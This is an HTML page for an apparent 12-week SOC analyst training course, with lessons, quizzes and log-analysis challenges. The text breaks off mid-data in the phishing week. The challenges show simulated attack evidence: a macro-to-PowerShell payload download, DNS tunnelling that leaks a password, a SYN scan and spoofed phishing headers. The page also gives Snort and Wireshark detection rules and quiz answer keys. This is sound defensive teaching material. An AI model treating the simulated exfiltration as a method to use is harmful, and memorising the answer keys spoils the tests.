<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SOC Analyst in 12 Weeks</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+Condensed:wght@600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root{
  /* layout: case-file workspace. top bar, one 880px reading column, evidence in mono blocks */
  --bg:#eef1f4; --surface:#ffffff; --ink:#15202b; --muted:#566777; --line:#d3dae1;
  --accent:#0a6c8f; --accent-ink:#ffffff; --tint:#e3f0f5;
  --good:#1b7548; --warn:#955600; --bad:#b3261e; --code:#f3f6f8;
  --display:"IBM Plex Sans Condensed","Arial Narrow",system-ui,sans-serif;
  --body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
  --mono:"IBM Plex Mono",ui-monospace,Consolas,monospace;
}
@media (prefers-color-scheme: dark){
  :root:not([data-theme="light"]){
    --bg:#0f151b; --surface:#172029; --ink:#e4ebf1; --muted:#95a5b5; --line:#2b3743;
    --accent:#5bbbdd; --accent-ink:#06222d; --tint:#1a2f3a;
    --good:#5fc391; --warn:#e2a650; --bad:#f28b84; --code:#111a22; color-scheme:dark;
  }
}
:root[data-theme="dark"]{
  --bg:#0f151b; --surface:#172029; --ink:#e4ebf1; --muted:#95a5b5; --line:#2b3743;
  --accent:#5bbbdd; --accent-ink:#06222d; --tint:#1a2f3a;
  --good:#5fc391; --warn:#e2a650; --bad:#f28b84; --code:#111a22; color-scheme:dark;
}
*{box-sizing:border-box}
html,body{margin:0}
body{background:var(--bg);color:var(--ink);font:16px/1.55 var(--body)}
a{color:var(--accent)}
h1,h2,h3{font-family:var(--display);font-weight:600;line-height:1.15;margin:0;text-wrap:balance}
h1{font-size:2rem} h2{font-size:1.35rem} h3{font-size:1.1rem}
h4{font:600 .8rem/1.2 var(--body);letter-spacing:.06em;text-transform:uppercase;color:var(--muted);margin:1.2em 0 .4em}
p{margin:.5em 0} ul{margin:.4em 0;padding-left:1.2em} li{margin:.25em 0}
code,pre{font-family:var(--mono);font-size:.84rem}
code{background:var(--code);padding:.08em .3em;border-radius:3px}
pre{background:var(--code);border:1px solid var(--line);border-radius:6px;padding:12px 14px;overflow-x:auto;margin:.6em 0;line-height:1.5;white-space:pre}
button,input{font:inherit;color:inherit}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}

.bar{position:sticky;top:0;z-index:5;background:var(--surface);border-bottom:1px solid var(--line)}
.bar-in{max-width:920px;margin:0 auto;padding:10px 20px;display:flex;gap:16px;align-items:center;flex-wrap:wrap}
.brand{font:600 1.05rem var(--display);letter-spacing:.02em;margin-right:auto;text-decoration:none;color:var(--ink)}
.brand span{color:var(--accent)}
nav{display:flex;gap:4px}
nav a{padding:6px 12px;border-radius:6px;text-decoration:none;color:var(--muted);font-weight:500;font-size:.95rem}
nav a[aria-current="page"]{background:var(--tint);color:var(--accent)}
.badge{display:inline-block;min-width:1.4em;padding:0 .4em;margin-left:4px;border-radius:9px;background:var(--warn);color:var(--surface);font-size:.75rem;text-align:center;font-weight:600}
.sync{font-size:.78rem;color:var(--muted);display:flex;align-items:center;gap:6px}
.sync i{width:8px;height:8px;border-radius:50%;background:var(--muted);display:inline-block}
.sync.cloud i{background:var(--good)} .sync.local i{background:var(--warn)}

main{max-width:920px;margin:0 auto;padding:28px 20px 80px;display:flex;flex-direction:column;gap:20px}
.card{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:20px 22px}
.card>h2{margin-bottom:10px}
.eyebrow{font:500 .8rem var(--mono);color:var(--muted);letter-spacing:.04em;text-transform:uppercase}
.lead{color:var(--muted);max-width:65ch}
.row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px}
.stat{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
.stat b{display:block;font:600 1.6rem var(--display);font-variant-numeric:tabular-nums}
.stat span{font-size:.82rem;color:var(--muted)}
.stat.due b{color:var(--warn)}
.btn{background:var(--accent);color:var(--accent-ink);border:0;border-radius:6px;padding:9px 16px;font-weight:600;cursor:pointer;text-decoration:none;display:inline-block}
.btn.ghost{background:transparent;color:var(--accent);border:1px solid var(--line)}
.btn.small{padding:5px 10px;font-size:.85rem}
.btn:disabled{opacity:.5;cursor:not-allowed}
.chip{display:inline-block;font:500 .72rem var(--mono);padding:2px 8px;border-radius:4px;border:1px solid var(--line);color:var(--muted);text-transform:uppercase;letter-spacing:.04em;white-space:nowrap}
.chip.good{color:var(--good);border-color:var(--good)} .chip.warn{color:var(--warn);border-color:var(--warn)}
.chip.bad{color:var(--bad);border-color:var(--bad)} .chip.acc{color:var(--accent);border-color:var(--accent)}
.meter{height:6px;background:var(--line);border-radius:3px;overflow:hidden;min-width:80px;flex:1}
.meter i{display:block;height:100%;background:var(--accent)}
.next{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:8px}
.next li{display:flex;gap:12px;align-items:center;justify-content:space-between;padding:10px 12px;border:1px solid var(--line);border-radius:8px;margin:0;flex-wrap:wrap}
.strip{display:grid;grid-template-columns:repeat(12,1fr);gap:6px}
.strip a{display:block;text-align:center;padding:8px 0;border-radius:6px;border:1px solid var(--line);text-decoration:none;color:var(--muted);font:500 .85rem var(--mono);position:relative;overflow:hidden}
.strip a i{position:absolute;left:0;bottom:0;height:4px;background:var(--accent)}
.strip a.cur{border-color:var(--accent);color:var(--accent)} .strip a.done{background:var(--tint);color:var(--accent)}
.strip a.lock{opacity:.45}
@media(max-width:560px){.strip{grid-template-columns:repeat(6,1fr)}}

.stage{display:flex;flex-direction:column;gap:8px}
.stage.locked .wk{opacity:.5}
.wk{display:grid;grid-template-columns:44px 1fr auto;gap:14px;align-items:center;padding:12px 16px;background:var(--surface);border:1px solid var(--line);border-radius:8px;text-decoration:none;color:var(--ink)}
.wk .n{font:600 1.3rem var(--display);color:var(--accent);font-variant-numeric:tabular-nums}
.wk small{color:var(--muted);display:block}
.wk.exam{border-style:dashed}
.wk .side{display:flex;gap:10px;align-items:center;min-width:150px;justify-content:flex-end}
@media(max-width:560px){.wk{grid-template-columns:36px 1fr}.wk .side{grid-column:2;justify-content:flex-start}}

.tasks{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px}
.tasks label{display:grid;grid-template-columns:22px 1fr auto;gap:10px;align-items:start;padding:10px 12px;border:1px solid var(--line);border-radius:8px;cursor:pointer}
.tasks input{width:18px;height:18px;margin-top:3px;accent-color:var(--accent)}
.tasks .done{color:var(--muted);text-decoration:line-through}
.note{border-left:3px solid var(--accent);background:var(--tint);padding:10px 14px;border-radius:0 6px 6px 0;font-size:.95rem}
.lesson{max-width:70ch}
.opts{display:flex;flex-direction:column;gap:8px;margin:14px 0}
.opt{text-align:left;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:11px 14px;cursor:pointer;overflow-wrap:anywhere}
.opt:hover:not(:disabled){border-color:var(--accent)}
.opt.right{border-color:var(--good);background:color-mix(in srgb,var(--good) 12%,var(--surface))}
.opt.wrong{border-color:var(--bad);background:color-mix(in srgb,var(--bad) 12%,var(--surface))}
.why{font-size:.95rem;color:var(--muted);margin:8px 0 14px}
.qtext{font-weight:500;font-size:1.05rem;overflow-wrap:anywhere}
.cq{display:grid;grid-template-columns:1fr;gap:6px;padding:12px 0;border-top:1px solid var(--line)}
.cq .in{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.cq input{flex:1;min-width:180px;padding:8px 10px;border:1px solid var(--line);border-radius:6px;background:var(--bg);font-family:var(--mono);font-size:.9rem}
.cq.ok input{border-color:var(--good)} .cq.no input{border-color:var(--bad)}
.hint{font-size:.8rem;color:var(--muted)}
.ev{position:relative}
.ev .btn{position:absolute;top:8px;right:8px}
.ev pre{padding-top:40px;max-height:420px;overflow:auto}
.timer{position:sticky;top:58px;z-index:4;background:var(--surface);border:1px solid var(--accent);border-radius:8px;padding:8px 14px;display:flex;justify-content:space-between;align-items:center;font-family:var(--mono)}
.eq{padding:16px 0;border-top:1px solid var(--line)}
.eq label{display:flex;gap:10px;padding:7px 10px;border-radius:6px;cursor:pointer;align-items:flex-start;overflow-wrap:anywhere}
.eq label:hover{background:var(--tint)}
.eq input{margin-top:5px;accent-color:var(--accent)}
.eq .r{color:var(--good);font-weight:600} .eq .w{color:var(--bad);text-decoration:line-through}
.big{font:600 3rem var(--display);font-variant-numeric:tabular-nums}
.boxes{display:flex;gap:8px;align-items:flex-end;height:90px}
.boxes div{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:flex-end;gap:4px;font:500 .75rem var(--mono);color:var(--muted);height:100%}
.boxes i{display:block;width:100%;background:var(--accent);border-radius:3px 3px 0 0;min-height:2px}
footer{font-size:.82rem;color:var(--muted);display:flex;gap:12px;justify-content:space-between;flex-wrap:wrap;align-items:center}
@media (prefers-reduced-motion:no-preference){.meter i,.strip a i{transition:width .3s}}
</style>
</head>

<script>
const D = {"weeks":[{"title":"How a SOC thinks","module":"Frameworks and the analyst mindset","goal":"Describe any attack in the shared language of the Kill Chain, MITRE ATT&CK and the Pyramid of Pain.","tasks":[["thm","TryHackMe SOC Level 1: finish the module \"Blue Team Introduction\"",2],["thm","TryHackMe SOC Level 1: finish the module \"Cyber Defence Frameworks\" (Pyramid of Pain, Cyber Kill Chain, Unified Kill Chain, MITRE)",3.5],["own","Pick one public breach write-up and map 5 of its steps to ATT&CK technique IDs at attack.mitre.org",1]],"note":"You are 24% into this path, so most of this week is probably ticked already. Tick what is done and move straight to the quiz. Time you save here is your buffer for later weeks.","lesson":"\u003cp>Every alert you will ever triage is one step of a longer story. Frameworks give you the vocabulary to say which step, so a colleague or a report reader understands in one line.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>Cyber Kill Chain\u003c/b>, 7 phases in order: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives.\u003c/li>\n\u003cli>\u003cb>MITRE ATT&amp;CK\u003c/b>: a \u003ci>tactic\u003c/i> is the attacker's goal (Persistence), a \u003ci>technique\u003c/i> is how (T1053 Scheduled Task), a sub-technique is the exact variant (T1053.005).\u003c/li>\n\u003cli>\u003cb>Pyramid of Pain\u003c/b>, bottom to top: Hash values, IP addresses, Domain names, Network/Host artifacts, Tools, TTPs. The higher you detect, the more it costs the attacker to adapt.\u003c/li>\n\u003cli>\u003cb>Alert outcomes\u003c/b>: true positive (real attack, alert fired), false positive (benign, alert fired), false negative (real attack, no alert).\u003c/li>\n\u003cli>\u003cb>L1 job\u003c/b>: take ownership, gather context, decide TP or FP, document, escalate what is outside your scope.\u003c/li>\u003c/ul>\n\u003ch4>Common trap\u003c/h4>\u003cp>Mixing up tactic and technique. Test yourself: \"Phishing\" is a technique (T1566); the tactic it serves is Initial Access.\u003c/p>\n\u003ch4>Say it out loud\u003c/h4>\u003cp>Without notes, explain to an imaginary interviewer why blocking a file hash is weaker than detecting a behaviour.\u003c/p>","quiz":[{"q":"Which level of the Pyramid of Pain is hardest for an attacker to change?","o":["Hash values","Domain names","Tools","TTPs"],"a":3,"why":"TTPs are the attacker's habits and methods. Changing them means retraining and re-engineering the whole operation."},{"q":"In the Cyber Kill Chain, which phase comes directly after Delivery?","o":["Installation","Exploitation","Weaponization","Command and Control"],"a":1,"why":"Order: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives."},{"q":"In MITRE ATT&CK, what does a tactic describe?","o":["The exact command the attacker ran","The attacker's goal at that step","The malware family used","The vulnerability exploited"],"a":1,"why":"Tactic = why (goal). Technique = how."},{"q":"An attacker stole data for a week and no alert ever fired. What is this called?","o":["False positive","True negative","False negative","True positive"],"a":2,"why":"Malicious activity happened and detection missed it: false negative, the most dangerous outcome."},{"q":"A new alert appears in the queue. What should an L1 analyst do first?","o":["Close it if the severity is low","Take ownership and review who, what host and when","Immediately isolate the host","Escalate to L2 without reading it"],"a":1,"why":"Ownership and context come first. Verdict and action follow from evidence."},{"q":"Which detection is easiest for an attacker to bypass?","o":["Rule on a file hash","Rule on a parent-child process pattern","Rule on beaconing behaviour","Rule on abnormal logon patterns"],"a":0,"why":"Recompiling or changing one byte gives a new hash. Behavioural detections survive that."},{"q":"When should an L1 analyst escalate to L2?","o":["Whenever an alert has high severity, before investigating","When a true positive needs action or analysis beyond L1 scope","Only when a manager asks","Never; L1 closes all alerts"],"a":1,"why":"Escalate confirmed or likely incidents that need deeper investigation or remediation you are not authorised to perform."}],"chal":{"title":"Map an intrusion to the frameworks","brief":"Read the timeline and answer in framework terms. Use attack.mitre.org if you need it; that is what analysts do.","evidence":"# Incident timeline, finance workstation FIN-PC-07, 2026-11-09\n09:02  User receives email \"Invoice Q4\" with attachment Invoice_Q4.docm from billing@acme-invoices.example\n09:05  User opens the document and enables macros. The macro starts powershell.exe\n09:05  powershell.exe downloads upd.exe from 185.220.101.47\n09:06  upd.exe creates a scheduled task \"OneDriveSync\" that runs upd.exe at every logon\n09:10  upd.exe connects to 185.220.101.47:443 every 60 seconds and waits for instructions","qs":[{"p":"ATT&CK technique ID (with sub-technique) for how the attacker got in at 09:02","h":["1tsi92022yi"],"hint":"Format T####.###"},{"p":"ATT&CK tactic served by the scheduled task at 09:06","h":["108vu694nti"],"hint":"One word"},{"p":"Cyber Kill Chain phase of the 09:10 activity","h":["2jw8o7g1vh","u13ov5fspq","1h8mn16rwvl","11wp1kydh4s","31f8j3bmac"],"hint":""},{"p":"You block 185.220.101.47 on the firewall. Which Pyramid of Pain level is that?","h":["1f4mo3nth6n","1af045jw1qy","1pf5cwevapw","9rpwkqag2x"],"hint":""}]}},{"title":"Reading the wire","module":"Networking core and Wireshark","goal":"Open a packet capture and say who talked to whom, on which port, and whether it looks like a scan or normal traffic.","tasks":[["thm","TryHackMe SOC Level 1: module \"Network Traffic Analysis\" (Wireshark rooms and NetworkMiner)",5],["pwn","pwn.college, Intro to Cybersecurity dojo, module \"Intercepting Communication\": watch the IP and TCP lectures, solve the first 6 challenges",2],["own","Capture 2 minutes of your own traffic in Wireshark. Find one DNS query, one TCP handshake and one TLS Client Hello",0.5]],"lesson":"\u003cp>You marked networking as weak. It is also the area that separates analysts who guess from analysts who know, so this stage gives it two full weeks.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>TCP handshake\u003c/b>: SYN, SYN-ACK, ACK. Open port answers SYN with SYN-ACK. Closed port answers with RST.\u003c/li>\n\u003cli>\u003cb>Ports\u003c/b>: 22 SSH, 25 SMTP, 53 DNS, 80 HTTP, 88 Kerberos, 135 RPC, 389 LDAP, 443 HTTPS, 445 SMB, 3389 RDP.\u003c/li>\n\u003cli>\u003cb>Layers\u003c/b>: Ethernet/MAC (2), IP (3), TCP/UDP (4), application (7). ARP maps IP to MAC inside one LAN.\u003c/li>\n\u003cli>\u003cb>Capture filter\u003c/b> (BPF, decides what is saved) versus \u003cb>display filter\u003c/b> (hides packets already captured).\u003c/li>\u003c/ul>\n\u003ch4>Cheat sheet\u003c/h4>\n\u003cpre>ip.addr == 10.0.0.5                       traffic to or from a host\ntcp.port == 445                            one port\ntcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0   SYN only (scan hunting)\nhttp.request.method == \"POST\"              uploads and logins\ndns.qry.name contains \"evil\"               DNS lookups\narp.duplicate-address-detected             ARP spoofing\nStatistics &gt; Conversations                 top talkers, first stop in any pcap\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Starting to read packets one by one. Always start with Statistics (Protocol Hierarchy, Conversations, Endpoints), then filter.\u003c/p>","quiz":[{"q":"What is the correct order of the TCP three-way handshake?","o":["SYN, ACK, SYN-ACK","SYN, SYN-ACK, ACK","ACK, SYN, SYN-ACK","SYN-ACK, SYN, ACK"],"a":1,"why":"Client SYN, server SYN-ACK, client ACK."},{"q":"A host sends a SYN to a closed TCP port. What normally comes back?","o":["SYN-ACK","Nothing, always","RST","FIN"],"a":2,"why":"A closed port replies RST (shown as RST, ACK). Silence usually means a firewall dropped it."},{"q":"Which Wireshark display filter shows HTTP requests involving 10.0.0.5?","o":["host 10.0.0.5 and port 80","ip.addr == 10.0.0.5 && http.request","http.host = 10.0.0.5","tcp contains 10.0.0.5"],"a":1,"why":"\"host ... and port ...\" is capture-filter (BPF) syntax, not display-filter syntax."},{"q":"Which sign points to ARP poisoning on a LAN?","o":["Many DNS queries","One MAC address claiming the gateway IP and another host's IP","TLS on port 443","A TTL of 64"],"a":1,"why":"The attacker answers ARP for IPs it does not own, so one MAC maps to several IPs."},{"q":"At which OSI layer does IP operate?","o":["Layer 2","Layer 3","Layer 4","Layer 7"],"a":1,"why":"IP is the network layer (3). TCP and UDP are layer 4."},{"q":"What is the difference between a capture filter and a display filter?","o":["There is none","Capture filters decide what is recorded; display filters only hide recorded packets","Display filters are faster","Capture filters work only on Wi-Fi"],"a":1,"why":"A packet excluded by a capture filter is gone for good."},{"q":"Which port and protocol does a normal DNS query use?","o":["TCP 53 only","UDP 53","UDP 35","TCP 443"],"a":1,"why":"Queries normally use UDP 53. TCP 53 appears for large responses and zone transfers."}],"chal":{"title":"Identify the scan","brief":"This is tshark output from a server subnet. Work out who is scanning, what they found, and how you would isolate it in Wireshark.","evidence":"# tshark -r capture.pcap -T fields  (time  src -> dst  ports  flags)\n0.000100  10.0.0.23 -> 10.0.0.5   51000 -> 21    [SYN]\n0.000180  10.0.0.5  -> 10.0.0.23  21 -> 51000    [RST, ACK]\n0.000310  10.0.0.23 -> 10.0.0.5   51000 -> 22    [SYN]\n0.000395  10.0.0.5  -> 10.0.0.23  22 -> 51000    [SYN, ACK]\n0.000450  10.0.0.23 -> 10.0.0.5   51000 -> 22    [RST]\n0.000520  10.0.0.23 -> 10.0.0.5   51000 -> 23    [SYN]\n0.000600  10.0.0.5  -> 10.0.0.23  23 -> 51000    [RST, ACK]\n0.000710  10.0.0.23 -> 10.0.0.5   51000 -> 80    [SYN]\n0.000790  10.0.0.5  -> 10.0.0.23  80 -> 51000    [SYN, ACK]\n0.000840  10.0.0.23 -> 10.0.0.5   51000 -> 80    [RST]\n0.000910  10.0.0.23 -> 10.0.0.5   51000 -> 443   [SYN]\n0.000990  10.0.0.5  -> 10.0.0.23  443 -> 51000   [RST, ACK]\n0.001100  10.0.0.23 -> 10.0.0.5   51000 -> 445   [SYN]\n0.001185  10.0.0.5  -> 10.0.0.23  445 -> 51000   [SYN, ACK]\n0.001240  10.0.0.23 -> 10.0.0.5   51000 -> 445   [RST]\n0.001320  10.0.0.23 -> 10.0.0.5   51000 -> 3389  [SYN]\n0.001400  10.0.0.5  -> 10.0.0.23  3389 -> 51000  [RST, ACK]","qs":[{"p":"IP address of the scanner","h":["xvj2ahznv9"],"hint":""},{"p":"Open ports on the target, ascending, comma separated","h":["278et5vqvid"],"hint":"Example: 21,25"},{"p":"The scanner never completes the handshake. What is this scan type called?","h":["1dl8vnt0m5r","1311inlxqwi","57j5nwvl6t","7iatvhoiur","jl5hco30cz","1jemoy9h2e3","20e6rw4wzjc","q5sgmyaagn","1r0xn1p2ccf","3lh3g5gcr8","15qx36crocd"],"hint":""},{"p":"Wireshark display filter that shows only the scanner's SYN packets without ACK","h":["23ky7phy9ip","167nikgg96s","qdwli7ru0c","103ssgdhitt","93n3undnxq","1lzp96ekmeg","2f58lxv9zmv","2dko6z5rk1l","x5yjtx0psy"],"hint":"Spaces are ignored"}]}},{"title":"Watching the perimeter","module":"Network security monitoring","goal":"Recognise scanning, man-in-the-middle, tunnelling and exfiltration from network logs, and read a Snort rule.","tasks":[["thm","TryHackMe SOC Level 1: module \"Network Security Monitoring\"",5],["pwn","pwn.college \"Intercepting Communication\": continue through the sniffing and ARP challenges (aim for 8 more)",2],["own","Write two Snort rules from memory: one for ICMP to your subnet, one for TCP SYN to port 3389. Check the syntax against the docs",0.5]],"lesson":"\u003cp>Most attacks have to cross the network at least twice: once to get in, once to talk home. Network monitoring catches both even when the endpoint is blind.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>IDS\u003c/b> watches and alerts. \u003cb>IPS\u003c/b> sits inline and can drop traffic.\u003c/li>\n\u003cli>\u003cb>Snort rule\u003c/b>: \u003ccode>action proto src_ip src_port -> dst_ip dst_port (options)\u003c/code>.\u003c/li>\n\u003cli>\u003cb>Beaconing\u003c/b>: connections at a regular interval with similar size, to the same destination.\u003c/li>\n\u003cli>\u003cb>DNS tunnelling\u003c/b>: many long, random-looking subdomains of one domain, often TXT queries, from one client.\u003c/li>\n\u003cli>\u003cb>Exfiltration\u003c/b>: unusual outbound volume, odd hours, new destination. Compare bytes out with the host's baseline.\u003c/li>\n\u003cli>\u003cb>Zeek logs\u003c/b>: conn.log (every connection), dns.log, http.log, ssl.log, files.log.\u003c/li>\u003c/ul>\n\u003ch4>Cheat sheet\u003c/h4>\n\u003cpre>alert tcp any any -> $HOME_NET 3389 (msg:\"RDP SYN\"; flags:S; sid:1000001; rev:1;)\nalert icmp any any -> $HOME_NET any (msg:\"ICMP in\"; sid:1000002; rev:1;)\nalert udp any any -> any 53 (msg:\"Large DNS\"; dsize:>100; sid:1000003; rev:1;)\n\ncat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes | sort | uniq -c | sort -nr | head\necho 686f73743d | xxd -r -p        decode hex\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Calling every big upload exfiltration. Check the destination and the host's role first: a backup server uploading at 03:00 is its job.\u003c/p>","quiz":[{"q":"What can an IPS do that an IDS cannot?","o":["Read encrypted traffic","Block traffic inline","Generate alerts","Use signatures"],"a":1,"why":"An IPS is deployed inline and can drop packets. An IDS only observes and alerts."},{"q":"Which is the correct layout of a Snort rule header?","o":["proto action src -> dst","action proto src_ip src_port -> dst_ip dst_port","action dst \u003c- src proto","msg action proto"],"a":1,"why":"Example: alert tcp any any -> $HOME_NET 22."},{"q":"Which pattern most strongly suggests DNS tunnelling?","o":["A few queries for www.google.com","Hundreds of long random subdomains of one domain from one host","A query answered with NXDOMAIN","DNS over UDP 53"],"a":1,"why":"Data is encoded into subdomain labels, so you see many unique, long, high-entropy names under one parent domain."},{"q":"A workstation connects to the same external IP every 60 seconds, each time sending about 300 bytes. What is the likely explanation?","o":["Video streaming","C2 beaconing","A port scan","ARP poisoning"],"a":1,"why":"Regular interval plus consistent small size is the classic beacon signature."},{"q":"What does Zeek conn.log record?","o":["Only DNS queries","A summary of every connection: endpoints, ports, duration, bytes","Full packet payloads","Windows event logs"],"a":1,"why":"conn.log is the flow record and the starting point for most Zeek investigations."},{"q":"Which attack is the usual way to become man-in-the-middle on a local network?","o":["SQL injection","ARP spoofing","Kerberoasting","Password spraying"],"a":1,"why":"Poisoning ARP caches redirects victims' traffic through the attacker."},{"q":"A database server uploads 40 GB to an unknown external host at 03:00. What is the best first check?","o":["Reboot the server","Compare with the host's normal outbound volume and identify the destination","Ignore it; nights are for backups","Delete the database"],"a":1,"why":"Baseline and destination ownership decide whether this is a backup job or exfiltration."}],"chal":{"title":"Data leaving through DNS","brief":"A night-shift alert says \"unusual DNS volume\". Find the infected client and recover what it leaked. Copy the log into a file and use cut, grep and xxd, or CyberChef.","evidence":"# dns.log (time, client, type, query) - night of 2026-11-14\n03:14:02  10.10.5.12  A    www.google.com\n03:14:05  10.10.5.44  TXT  00.686f73743d46.cdn-telemetry.net\n03:14:10  10.10.5.31  A    outlook.office365.com\n03:14:13  10.10.5.44  TXT  01.494e2d50432d.cdn-telemetry.net\n03:14:18  10.10.5.12  A    ctldl.windowsupdate.com\n03:14:21  10.10.5.44  TXT  02.30373b757365.cdn-telemetry.net\n03:14:26  10.10.5.44  A    teams.microsoft.com\n03:14:29  10.10.5.44  TXT  03.723d6a736d69.cdn-telemetry.net\n03:14:34  10.10.5.20  A    github.com\n03:14:37  10.10.5.44  TXT  04.74683b706173.cdn-telemetry.net\n03:14:42  10.10.5.31  A    time.windows.com\n03:14:45  10.10.5.44  TXT  05.733d57696e74.cdn-telemetry.net\n03:14:50  10.10.5.12  A    fonts.gstatic.com\n03:14:53  10.10.5.44  TXT  06.657232303236.cdn-telemetry.net\n03:14:58  10.10.5.20  A    pypi.org\n03:15:01  10.10.5.44  TXT  07.21.cdn-telemetry.net","qs":[{"p":"IP of the client doing the tunnelling","h":["1j2cdp93pm5"],"hint":""},{"p":"Parent domain used for the tunnel","h":["14izdqr8o4p","1xafj8bs9rh"],"hint":""},{"p":"How many queries carried data to that domain?","h":["25i2gekeftp"],"hint":"A number"},{"p":"Join the hex labels in order and decode them. What password was stolen?","h":["1pxbe106rhy"],"hint":"Case does not matter here"},{"p":"Snort option that matches on payload size, as in \"___:>100;\"","h":["1e9250wxl1j"],"hint":"One keyword"}]}},{"title":"The inbox is the front door","module":"Phishing analysis","goal":"Read raw email headers, judge SPF, DKIM and DMARC results, and extract indicators safely.","tasks":[["thm","TryHackMe SOC Level 1: module \"Phishing Analysis\"",5],["thm","TryHackMe SOC Simulator: run the introductory phishing scenario once and note your score",1.5],["own","Open a real spam email from your own mailbox, view the original headers, and write down sending IP, SPF result and Reply-To",0.5]],"lesson":"\u003cp>Phishing is the most common first alert for a junior analyst, and the SAL1 exam simulator leans on it. Being fast and correct here pays twice.\u003c/p>\n\u003ch4>Know cold\u003c/h4>\n\u003cul>\u003cli>\u003cb>SPF\u003c/b>: is the sending IP allowed to send for the envelope-from (Return-Path) domain?\u003c/li>\n\u003cli>\u003cb>DKIM\u003c/b>: a signature proving the message was signed by that domain and not altered.\u003c/li>\n\u003cli>\u003cb>DMARC\u003c/b>: does the visible From domain align with a passing SPF or DKIM, and what should the receiver do if not (none, quarantine, reject)?\u003c/li>\n\u003cli>\u003cb>Received headers\u003c/b> are added by each server. Read them bottom to top to follow the path.\u003c/li>\n\u003cli>\u003cb>From\u003c/b> is what the user sees and is trivially forged. \u003cb>Return-Path\u003c/b> and \u003cb>Reply-To\u003c/b> show where bounces and replies really go.\u003c/li>\n\u003cli>\u003cb>Defang\u003c/b> indicators before sharing: hxxp://bad[.]example.\u003c/li>\u003c/ul>\n\u003ch4>Workflow\u003c/h4>\n\u003cpre>1. Headers: sender IP, Return-Path, Reply-To, auth results\n2. Body: urgency, mismatch between link text and real href\n3. URLs: defang, check reputation, never click from your workstation\n4. Attachments: hash it (sha256sum), look the hash up, sandbox if unknown\n5. Scope: who else received it? did anyone click?\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>\"SPF pass\" does not mean safe. An attacker who owns evil-domain.example passes SPF for evil-domain.example perfectly.\u003c/p>","quiz":[{"q":"What does SPF verify?","o":["That the body was not altered","That the sending IP is authorised for the envelope-from domain","That the recipient exists","That the attachment is clean"],"a":1,"why":"SPF is a DNS record listing which IPs may send for a domain."},{"q":"What does DKIM add to an email?","o":["Encryption of the body","A cryptographic signature tied to the sending domain","A spam score","The sender's IP"],"a":1,"why":"DKIM signs selected headers and the body, so tampering and domain forgery are detectable."},{"q":"What does DMARC check?","o":["Attachment types","That the visible From domain aligns with passing SPF or DKIM, and applies a policy","TLS version","The size of the email"],"a":1,"why":"DMARC ties the user-visible From to the authenticated domain and tells receivers what to do on failure."},{"q":"How do you follow the real path of an email through servers?","o":["Read the Subject","Read the Received headers from bottom to top","Trust the From field","Read the Received headers top to bottom"],"a":1,"why":"Each hop prepends a Received header, so the oldest hop is at the bottom."},{"q":"Which is a correctly defanged URL?","o":["http://evil.com","hxxp://evil[.]com","http//evil.com","evil dot com slash"],"a":1,"why":"Defanging stops accidental clicks and auto-linking while keeping the indicator readable."},{"q":"What is the safest way to assess a suspicious attachment?","o":["Open it to see what happens","Compute its hash, check reputation, and detonate in a sandbox if unknown","Forward it to colleagues","Rename it to .txt and open"],"a":1,"why":"Never open on a production workstation. Hash lookup first, sandbox second."},{"q":"An email with no link and no attachment asks finance to pay an invoice urgently, appearing to come from the CEO. What is this?","o":["Ransomware","Business email compromise","DNS tunnelling","A worm"],"a":1,"why":"BEC relies on impersonation and urgency. There is no malware for tools to catch."}],"chal":{"title":"Dissect a reported email","brief":"A user clicked \"Report phishing\". These are the raw headers and what the gateway extracted from the body.","evidence":"Return-Path: \u003cbounce@mailer-contosopay-secure.example>\nReceived: from mx.northwind.example (10.0.1.5) by mbx02.northwind.example; Thu, 12 Nov 2026 09:14:27 +0200\nReceived: from mail.mailer-contosopay-secure.example (unknown [203.0.113.77])\n        by mx.northwind.example with ESMTP; Thu, 12 Nov 2026 09:14:25 +0200\nAuthentication-Results: mx.northwind.example;\n        spf=fail (sender IP is 203.0.113.77) smtp.mailfrom=mailer-contosopay-secure.example;\n        dkim=none; dmarc=fail action=none header.from=contosopay.example\nFrom: \"Contoso Pay Support\" \u003cservice@contosopay.example>\nReply-To: helpdesk.contosopay@freemail-box.example\nTo: i.munteanu@northwind.example\nSubject: Action required: your account is limited\nDate: Thu, 12 Nov 2026 09:14:20 +0200\n\n--- extracted by gateway ---\nLink text : https://www.contosopay.example/signin\nLink href : hxxps://contosopay-signin[.]verify-portal[.]example/login.php\nAttachment: Statement_Nov.pdf.exe  (sha256 4b1e0c6f5a2d9e8b7c3a1f0d6e5b4c3a2918f7e6d5c4b3a291807f6e5d4c3b2a)","qs":[{"p":"IP address of the server that handed the mail to Northwind","h":["1dznytdlwio"],"hint":""},{"p":"SPF result","h":["2176gz7bzos"],"hint":"One word"},{"p":"If the user replies, which address receives 